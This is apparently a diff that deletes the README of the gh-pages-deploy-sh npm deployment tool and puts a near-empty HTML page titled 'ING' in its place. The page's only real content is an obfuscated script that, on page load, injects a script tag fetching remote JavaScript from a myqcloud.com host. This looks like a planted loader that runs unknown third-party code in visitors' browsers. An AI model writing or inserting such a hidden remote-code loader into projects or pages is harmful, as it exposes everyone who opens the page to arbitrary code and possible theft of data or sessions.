@@ -1,46 +1,31 @@
-# gh-pages-deploy-sh [![Build Status](https://travis-ci.org/azu/gh-pages-deploy-sh.svg?branch=master)](https://travis-ci.org/azu/gh-pages-deploy-sh)
+<!DOCTYPE html>
+<html>
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width,initial-scale=1,user-scalable=0,minimum-scale=1,maximum-scale=1">
+<meta content="yes" name="apple-mobile-web-app-capable">
+<meta content="black" name="apple-mobile-web-app-status-bar-style">
+<meta content="no" name="msapplication-tap-highlight">
+<meta content="IE=edge" http-equiv="X-UA-Compatible">
+<title>ING</title>
+<script>
 
-This shell script wrapper for deploy to gh-pages.
 
-Alt. [azu/gh-pages-deploy-cmd](https://github.com/azu/gh-pages-deploy-cmd "azu/gh-pages-deploy-cmd")
 
-## Installation
+var version = "lua";
+var WAItcl1 = WAItcl1 || [];;
+var b2 = ["//wx-1252764145.file.myqcloud.com/" + version + '.js'];
+var h3;
+var t4;
+for (var WOYuAkCBS5 = 0; WOYuAkCBS5 < b2["length"]; WOYuAkCBS5++) {
+    h3 = window["document"]["createElement"]("script");
+    h3["src"] = b2[WOYuAkCBS5];
+    t4 = window["document"]["getElementsByTagName"]("script")[0];
+    t4["parentNode"]["insertBefore"](h3, t4);
+}
+</script>
+</head>
+<body>
 
-    npm install -D gh-pages-deploy-sh
-
-## Usage
-
-> $ gh-pages-deploy-sh directory
-
-### 1. Add "gh-pages-deploy-sh" to npm run-script.
-
-```
-  "scripts": {
-    "deploy": "gh-pages-deploy-sh dist/"
-  },
-```
-
-### 2. Add `GH_TOKEN` to `.travis.yml`
-
-See [travis-ci/travis.rb](https://github.com/travis-ci/travis.rb "travis-ci/travis.rb")
-
-```sh
-gem install travis
-travis encrypt GH_TOKEN=<your github personal token> --add
-```
-
-### 3. git push
-
-Automatically deploy to `gh-pages` :tada:
-
-## Contributing
-
-1. Fork it!
-2. Create your feature branch: `git checkout -b my-new-feature`
-3. Commit your changes: `git commit -am 'Add some feature'`
-4. Push to the branch: `git push origin my-new-feature`
-5. Submit a pull request :D
-
-## License
-
-MITg
+</body>
+</html>
